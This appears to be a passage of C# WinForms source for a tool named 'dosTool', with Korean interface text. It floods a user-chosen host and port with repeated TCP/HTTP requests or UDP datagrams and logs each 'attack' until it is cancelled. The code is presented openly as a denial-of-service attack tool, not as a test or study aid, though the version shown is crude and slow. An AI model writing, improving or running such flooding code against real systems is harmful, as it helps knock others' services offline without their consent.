using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace dosTool
{
    public partial class Form1 : Form
    {
        private bool _canceled;
        private bool _isChanged;
        private bool _isTcp;
        private bool _ready;

        public Form1()
        {
            InitializeComponent();
        }

        private void TcpDos()
        {
            _canceled = false;
            _ready = true;

            try
            {
                for (;;)
                {
                    if (_canceled)
                    {
                        _canceled = false;
                        _ready = false;

                        richTextBox1.Text += $"[{DateTime.Now:tt hh:mm:ss}] [TCP] 공격 취소됨\n";
                        break;
                    }

                    string url = richTextBox2.Text;
                    int port = int.Parse(richTextBox3.Text);

                    var webClient = new WebClient();
                    webClient.DownloadStringAsync(new Uri($"{url}:{port}"));
                    webClient.Dispose();

                    richTextBox1.Text += $"[{DateTime.Now:tt hh:mm:ss}] [TCP] {url}:{port}로 요청\n";

                    Delay(1000);
                }
            }
            catch (Exception e)
            {
                richTextBox1.Text += $"[{DateTime.Now:tt hh:mm:ss}] [TCP] {e.Message} 오류로 TCP 공격이 취소됨\n";
                _ready = false;
            }
        }

        private void UdpDos()
        {
            _canceled = false;
            _ready = true;

            try
            {
                for (;;)
                {
                    if (_canceled)
                    {
                        _canceled = false;
                        _ready = false;

                        richTextBox1.Text += $"[{DateTime.Now:tt hh:mm:ss}] [UDP] 공격 취소됨\n";
                        break;
                    }

                    byte[] dataGram = Encoding.UTF8.GetBytes(
                        "");

                    string url = richTextBox2.Text;
                    int port = int.Parse(richTextBox3.Text);

                    var udpClient = new UdpClient();
                    udpClient.Send(dataGram, dataGram.Length, url, port);

                    richTextBox1.Text += $"[{DateTime.Now:tt hh:mm:ss}] [UDP] {url}:{port}로 {dataGram.Length} 바이트 전송\n";

                    Delay(1000);
                }
            }
            catch (Exception e)
            {
                richTextBox1.Text += $"[{DateTime.Now:tt hh:mm:ss}] [UDP] {e.Message} 오류로 UDP 공격이 취소됨\n";
                _ready = false;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (_ready)
            {
                MessageBox.Show("이미 공격 중입니다.", "DosTool");
                return;
            }

            if (richTextBox2.Text == "주소" || string.IsNullOrEmpty(richTextBox2.Text))
            {
                MessageBox.Show("주소를 입력해주세요", "DosTool");
                return;
            }

            if (richTextBox3.Text == "포트" || string.IsNullOrEmpty(richTextBox3.Text))
            {
                MessageBox.Show("포트를 입력해주세요", "DosTool");
                return;
            }

            if (!int.TryParse(richTextBox3.Text, out _))
            {
                MessageBox.Show("포트가 올바르지 못합니다.", "DosTool");
                return;
            }

            if (_isTcp)
                TcpDos();
            else
                UdpDos();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            _canceled = true;
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (_isChanged)
            {
                _isChanged = false;
                return;
            }

            if (checkBox2.Checked)
            {
                _isChanged = true;
                checkBox2.Checked = false;

                return;
            }

            _isTcp = true;
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (_isChanged)
            {
                _isChanged = false;
                return;
            }

            if (checkBox1.Checked)
            {
                _isChanged = true;
                checkBox1.Checked = false;

                return;
            }

            _isTcp = false;
        }

        private static void Delay(int ms)
        {
            DateTime thisMoment = DateTime.Now;
            var duration = new TimeSpan(0, 0, 0, 0, ms);
            DateTime afterWards = thisMoment.Add(duration);

            while (afterWards >= thisMoment)
            {
                Application.DoEvents();
                thisMoment = DateTime.Now;
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            richTextBox1.Text = "";
        }

